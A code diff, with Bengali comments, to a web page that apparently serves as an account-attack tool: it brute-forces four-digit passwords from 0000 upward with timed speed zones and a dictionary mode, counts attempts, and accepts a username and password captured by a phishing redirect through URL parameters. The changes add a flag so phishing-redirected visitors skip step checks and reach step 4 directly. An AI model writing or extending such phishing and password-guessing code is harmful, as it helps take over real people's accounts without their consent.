@@ -207,7 +207,7 @@
             display: flex;
             flex-direction: column;
             align-items: flex-start;
-            gap: 10px; /* এই লাইনটি পরিবর্তন করা হয়েছে */
+            gap: 10px;
         }
         #phishingResult {
             margin-top: 20px;
@@ -293,6 +293,7 @@
             let dictIndex = 0;
             let usingDictionary = false;
             let dictSlowMode = false;
+            let isPhishingRedirect = false; // নতুন ভেরিয়েবল যোগ করা হয়েছে।
             
             const BASE_DELAYS = {
                 Fast: 5, // for 0000-4053
@@ -342,7 +343,8 @@
 
             // স্টেপ পরিবর্তন করার ফাংশন
             window.selectStep = function(ruleNumber) {
-                if (ruleNumber > 1 && !completedSteps.includes(ruleNumber - 1)) {
+                // এখানে নতুন শর্ত যুক্ত করা হয়েছে। যদি isPhishingRedirect সত্য হয়, তাহলে এই চেকটি এড়িয়ে যাবে।
+                if (!isPhishingRedirect && ruleNumber > 1 && !completedSteps.includes(ruleNumber - 1)) {
                     showMessage(`আপনি আগে Step ${ruleNumber - 1} সম্পন্ন করুন।`);
                     return;
                 }
@@ -564,9 +566,12 @@
                 if (stepHistory.length > 1) {
                     stepHistory.pop();
                     const prevStep = stepHistory[stepHistory.length - 1];
+                    // goBack করার সময় isPhishingRedirect কে reset করা হচ্ছে।
+                    isPhishingRedirect = false; 
                     selectStep(prevStep);
                 } else {
                     stepHistory = [];
+                    isPhishingRedirect = false; // goBack করার সময় isPhishingRedirect কে reset করা হচ্ছে।
                     document.getElementById("ruleHeading").textContent = "Steps";
                     document.getElementById("buttonsContainer").style.display = "flex";
                     document.getElementById("backContainer").style.display = "none";
@@ -691,6 +696,7 @@
                 const formatted = pass.toString().padStart(4, '0');
                 const zoneInfo = getZoneForNumber(pass);
                 
+                document.getElementById("check-counter").textContent = `চেক করা হয়েছে: ${pass+1}`;
                 display.textContent = `বর্তমান পাসওয়ার্ড: ${formatted}`;
                 passInput.type = "text";
                 passInput.value = formatted;
@@ -815,14 +821,16 @@
             document.getElementById("ruleHeading").textContent = "Steps";
             document.getElementById("buttonsContainer").style.display = "flex";
             document.getElementById("backContainer").style.display = "none";
-            document.getElementById("backContainer").innerHTML = ""; // ব্যাক কন্টেইনার খালি করা।
+            document.getElementById("backContainer").innerHTML = "";
 
             // নতুন কোড: URL প্যারামিটার চেক করে সরাসরি স্টেপ 4 এ যাওয়া।
             const urlParams = new URLSearchParams(window.location.search);
             const capturedUser = urlParams.get('username');
             const capturedPass = urlParams.get('password');
             if (capturedUser && capturedPass) {
-                // যদি URL-এ ইউজারনেম এবং পাসওয়ার্ড থাকে
+                isPhishingRedirect = true;
+                // এই লাইনটি নিশ্চিত করবে যে, ব্যাক বাটন চাপলে স্টেপগুলো ঠিকঠাক দেখাবে।
+                completedSteps = [1, 2, 3]; 
                 rule3Method = "Phishing";
                 allowedStep4Access = true;
                 selectStep(4);
